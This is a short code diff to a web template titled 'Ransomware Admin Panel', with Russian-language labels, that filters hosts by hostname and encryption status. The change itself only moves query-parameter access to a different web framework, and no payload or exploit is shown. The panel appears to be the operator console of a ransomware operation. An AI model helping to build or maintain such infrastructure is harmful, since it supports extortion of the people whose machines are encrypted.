@@ -4,7 +4,7 @@
 <div class="card">
     <h2>Ransomware Admin Panel</h2>
     <form method="get" class="filter-bar">
-        <input type="text" name="hostname" placeholder="Поиск по hostname..." value="{{ request.args.get('hostname', '') }}">
+        <input type="text" name="hostname" placeholder="Поиск по hostname..." value="{{ request.query_params.get('hostname', '') }}">
         <select name="status">
             <option value="">Все статусы</option>
             <option value="success">Зашифровано</option>
